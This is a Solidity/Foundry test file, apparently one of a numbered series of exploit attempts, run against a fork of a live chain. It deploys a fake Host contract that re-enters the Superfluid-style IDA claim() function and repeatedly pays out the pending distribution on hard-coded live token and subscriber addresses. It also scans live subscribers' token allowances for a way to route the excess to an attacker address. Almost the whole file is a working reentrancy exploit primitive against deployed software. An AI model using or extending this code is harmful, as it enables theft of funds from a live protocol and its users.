// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";

interface IIDA36 {
    function claim(address token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx)
        external
        returns (bytes memory);

    function getSubscription(address token, address publisher, uint32 indexId, address subscriber)
        external
        view
        returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface IERC20Like36 {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

/// @title Attempt36
/// @notice Confirms the live FakeHost claim reentrancy primitive but closes the
///         current monetization branch: payout stays pinned to the live
///         subscriber, high reentry counts revert on SafeCast, and the top live
///         subscribers do not currently expose useful allowances to the attacker,
///         Host, or the relevant publisher apps.
contract Attempt36 is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    address internal constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address internal constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;

    address internal constant MATICX = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant TOKEN_2630 = 0x263026E7e53DBFDce5ae55Ade22493f828922965;

    address internal constant LIVE_PUBLISHER_MATICX = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address internal constant LIVE_SUBSCRIBER_SAFE = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    uint32 internal constant LIVE_INDEX_MATICX = 1;

    address internal constant LIVE_PUBLISHER_SAFE_USDCX = 0x0D0E1381d6F6f71E6F0D8f4970BF5bD53c23d7e5;
    address internal constant LIVE_PUBLISHER_TOP_EOA = 0x5786D3754443C0D3D1DdEA5bB550ccc476FdF11D;
    address internal constant LIVE_PUBLISHER_E007 = 0xE0073786618b886aA1aa44Df103850a227ADe9ae;
    address internal constant LIVE_PUBLISHER_CAB = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;

    address internal constant TOP_EOA_SUBSCRIBER = 0x0251AeB3407fDFFef515fC5f9731f010C476A0e6;
    address internal constant TOP_REX_SUBSCRIBER = 0x66177BDEc367f638be98e53d1493EE043d20b4a2;
    address internal constant THIRD_EOA_SUBSCRIBER = 0xeEcce11aF9d72ae9Ff15d7c106f13349D336aEaf;

    IIDA36 internal constant ida = IIDA36(IDA);

    function setUp() public {
        vm.createSelectFork("ch5", 27_039_967);
    }

    function test_fakeHost_reentrancy_multiplies_live_payout_but_still_pays_real_subscriber() public {
        FakeReentrantHost36 fakeHost = new FakeReentrantHost36(IDA);
        fakeHost.configure(MATICX, LIVE_PUBLISHER_MATICX, LIVE_INDEX_MATICX, LIVE_SUBSCRIBER_SAFE, 3);

        (bool exist, bool approved, uint128 units, uint256 pendingBefore) =
            ida.getSubscription(MATICX, LIVE_PUBLISHER_MATICX, LIVE_INDEX_MATICX, LIVE_SUBSCRIBER_SAFE);
        uint256 subscriberBefore = IERC20Like36(MATICX).balanceOf(LIVE_SUBSCRIBER_SAFE);
        uint256 attackerBefore = IERC20Like36(MATICX).balanceOf(ATTACKER);

        console.log("[live primitive] exist:", exist);
        console.log("[live primitive] approved:", approved);
        console.log("[live primitive] units:", uint256(units));
        console.log("[live primitive] pending before:", pendingBefore);

        fakeHost.attack();

        uint256 subscriberAfter = IERC20Like36(MATICX).balanceOf(LIVE_SUBSCRIBER_SAFE);
        uint256 attackerAfter = IERC20Like36(MATICX).balanceOf(ATTACKER);
        (,,, uint256 pendingAfter) =
            ida.getSubscription(MATICX, LIVE_PUBLISHER_MATICX, LIVE_INDEX_MATICX, LIVE_SUBSCRIBER_SAFE);

        uint256 subscriberDelta = subscriberAfter - subscriberBefore;
        uint256 attackerDelta = attackerAfter - attackerBefore;

        console.log("[live primitive] subscriber delta:", subscriberDelta);
        console.log("[live primitive] attacker delta:", attackerDelta);
        console.log("[live primitive] reentry count:", fakeHost.count());
        console.log("[live primitive] pending after:", pendingAfter);

        assertTrue(exist, "live tuple must exist");
        assertFalse(approved, "reentrancy primitive only works on the unapproved path");
        assertEq(fakeHost.count(), 3, "expected exactly three nested reentries");
        assertEq(subscriberDelta, pendingBefore * 4, "subscriber should receive outer claim plus 3 reentries");
        assertEq(attackerDelta, 0, "attacker never becomes the settlement recipient");
        assertEq(pendingAfter, 0, "claim should consume the pending distribution");
    }

    function test_large_reentry_still_only_pays_subscriber_and_never_attacker() public {
        FakeReentrantHost36 fakeHost = new FakeReentrantHost36(IDA);
        fakeHost.configure(MATICX, LIVE_PUBLISHER_MATICX, LIVE_INDEX_MATICX, LIVE_SUBSCRIBER_SAFE, 100);

        uint256 subscriberBefore = IERC20Like36(MATICX).balanceOf(LIVE_SUBSCRIBER_SAFE);
        uint256 attackerBefore = IERC20Like36(MATICX).balanceOf(ATTACKER);
        (,,, uint256 pendingBefore) =
            ida.getSubscription(MATICX, LIVE_PUBLISHER_MATICX, LIVE_INDEX_MATICX, LIVE_SUBSCRIBER_SAFE);

        console.log("[high reentry] pending before:", pendingBefore);
        console.log("[high reentry] subscriber before:", subscriberBefore);

        fakeHost.attack();

        uint256 subscriberAfter = IERC20Like36(MATICX).balanceOf(LIVE_SUBSCRIBER_SAFE);
        uint256 attackerAfter = IERC20Like36(MATICX).balanceOf(ATTACKER);
        (,,, uint256 pendingAfter) =
            ida.getSubscription(MATICX, LIVE_PUBLISHER_MATICX, LIVE_INDEX_MATICX, LIVE_SUBSCRIBER_SAFE);
        uint256 subscriberDelta = subscriberAfter - subscriberBefore;
        uint256 attackerDelta = attackerAfter - attackerBefore;

        console.log("[high reentry] subscriber after:", subscriberAfter);
        console.log("[high reentry] subscriber delta:", subscriberDelta);
        console.log("[high reentry] attacker delta:", attackerDelta);
        console.log("[high reentry] attempted reentries:", fakeHost.count());
        console.log("[high reentry] pending after:", pendingAfter);

        assertEq(fakeHost.count(), 100, "fake host should keep attempting nested reentry up to the configured cap");
        assertGt(subscriberDelta, pendingBefore, "aggressive reentry should still overpay the real subscriber");
        assertEq(attackerDelta, 0, "even aggressive reentry never credits the attacker");
        assertEq(pendingAfter, 0, "outer claim should still consume the pending distribution");
    }

    function test_top_live_subscribers_still_offer_no_direct_pull_surface() public view {
        console.log("[surface] safe code bytes:", LIVE_SUBSCRIBER_SAFE.code.length);
        console.log("[surface] top eoa code bytes:", TOP_EOA_SUBSCRIBER.code.length);
        console.log("[surface] rex eoa code bytes:", TOP_REX_SUBSCRIBER.code.length);
        console.log("[surface] third eoa code bytes:", THIRD_EOA_SUBSCRIBER.code.length);

        assertGt(LIVE_SUBSCRIBER_SAFE.code.length, 0, "safe should remain the lone code-bearing hot subscriber");
        assertEq(TOP_EOA_SUBSCRIBER.code.length, 0, "top subscriber is an EOA on the live fork");
        assertEq(TOP_REX_SUBSCRIBER.code.length, 0, "second subscriber is an EOA on the live fork");
        assertEq(THIRD_EOA_SUBSCRIBER.code.length, 0, "third subscriber is an EOA on the live fork");

        _assertZeroAllowance(MATICX, LIVE_SUBSCRIBER_SAFE, ATTACKER, "safe -> attacker MATICx");
        _assertZeroAllowance(MATICX, LIVE_SUBSCRIBER_SAFE, HOST, "safe -> host MATICx");
        _assertZeroAllowance(MATICX, LIVE_SUBSCRIBER_SAFE, LIVE_PUBLISHER_MATICX, "safe -> cab MATICx");
        _assertZeroAllowance(MATICX, LIVE_SUBSCRIBER_SAFE, LIVE_PUBLISHER_E007, "safe -> e007 MATICx");
        _assertZeroAllowance(MATICX, LIVE_SUBSCRIBER_SAFE, LIVE_PUBLISHER_TOP_EOA, "safe -> 5786 MATICx");
        _assertZeroAllowance(MATICX, LIVE_SUBSCRIBER_SAFE, LIVE_PUBLISHER_SAFE_USDCX, "safe -> 0d0e MATICx");

        _assertZeroAllowance(USDCX, LIVE_SUBSCRIBER_SAFE, ATTACKER, "safe -> attacker USDCx");
        _assertZeroAllowance(USDCX, LIVE_SUBSCRIBER_SAFE, HOST, "safe -> host USDCx");
        _assertZeroAllowance(USDCX, LIVE_SUBSCRIBER_SAFE, LIVE_PUBLISHER_SAFE_USDCX, "safe -> 0d0e USDCx");

        _assertZeroAllowance(TOKEN_2630, TOP_EOA_SUBSCRIBER, ATTACKER, "0251 -> attacker token2630");
        _assertZeroAllowance(TOKEN_2630, TOP_EOA_SUBSCRIBER, HOST, "0251 -> host token2630");
        _assertZeroAllowance(TOKEN_2630, TOP_EOA_SUBSCRIBER, LIVE_PUBLISHER_TOP_EOA, "0251 -> 5786 token2630");

        _assertZeroAllowance(TOKEN_2630, TOP_REX_SUBSCRIBER, ATTACKER, "6617 -> attacker token2630");
        _assertZeroAllowance(TOKEN_2630, TOP_REX_SUBSCRIBER, HOST, "6617 -> host token2630");
        _assertZeroAllowance(TOKEN_2630, TOP_REX_SUBSCRIBER, LIVE_PUBLISHER_E007, "6617 -> e007 token2630");
        _assertZeroAllowance(TOKEN_2630, TOP_REX_SUBSCRIBER, LIVE_PUBLISHER_CAB, "6617 -> cab token2630");

        _assertZeroAllowance(TOKEN_2630, THIRD_EOA_SUBSCRIBER, ATTACKER, "eecc -> attacker token2630");
        _assertZeroAllowance(TOKEN_2630, THIRD_EOA_SUBSCRIBER, HOST, "eecc -> host token2630");
        _assertZeroAllowance(TOKEN_2630, THIRD_EOA_SUBSCRIBER, LIVE_PUBLISHER_E007, "eecc -> e007 token2630");
        _assertZeroAllowance(TOKEN_2630, THIRD_EOA_SUBSCRIBER, LIVE_PUBLISHER_CAB, "eecc -> cab token2630");
    }

    function _assertZeroAllowance(address token, address owner, address spender, string memory label) internal view {
        uint256 allowance_ = IERC20Like36(token).allowance(owner, spender);
        console.log(label, allowance_);
        assertEq(allowance_, 0, label);
    }
}

contract FakeReentrantHost36 {
    address public immutable ida;
    address public token;
    address public publisher;
    address public subscriber;
    uint32 public indexId;
    uint256 public count;
    uint256 public maxCount;

    constructor(address _ida) {
        ida = _ida;
    }

    function configure(address _token, address _publisher, uint32 _indexId, address _subscriber, uint256 _maxCount)
        external
    {
        token = _token;
        publisher = _publisher;
        subscriber = _subscriber;
        indexId = _indexId;
        maxCount = _maxCount;
    }

    function attack() external {
        count = 0;
        IIDA36(ida).claim(token, publisher, indexId, subscriber, _ctx());
    }

    function getAppManifest(address) external pure returns (bool, bool, uint256) {
        return (true, false, 0);
    }

    function isApp(address) external pure returns (bool) {
        return true;
    }

    function isCtxValid(bytes calldata) external pure returns (bool) {
        return true;
    }

    function decodeCtx(bytes memory) external pure returns (
        uint8,
        uint8,
        uint256,
        address,
        bytes4,
        bytes memory,
        uint256,
        uint256,
        int256,
        address,
        address
    ) {
        return (0, 1, 0, address(0), bytes4(0), "", 0, 0, 0, address(0), address(0));
    }

    function appCallbackPush(bytes calldata, address, uint256, int256, address) external pure returns (bytes memory) {
        return abi.encode(uint256(0));
    }

    function appCallbackPop(bytes calldata, int256) external pure returns (bytes memory) {
        return abi.encode(uint256(0));
    }

    function callAppBeforeCallback(address, bytes calldata, bool, bytes calldata) external returns (bytes memory) {
        if (count < maxCount) {
            count++;
            try IIDA36(ida).claim(token, publisher, indexId, subscriber, _ctx()) { } catch { }
        }
        return "";
    }

    function callAppAfterCallback(address, bytes calldata, bool, bytes calldata ctx)
        external
        pure
        returns (bytes memory)
    {
        return ctx;
    }

    function _ctx() internal pure returns (bytes memory) {
        return abi.encode(
            abi.encode(uint256(1 << 32), uint256(0), address(0), bytes4(0), bytes("")),
            abi.encode(uint256(0), int256(0), address(0), address(0))
        );
    }
}
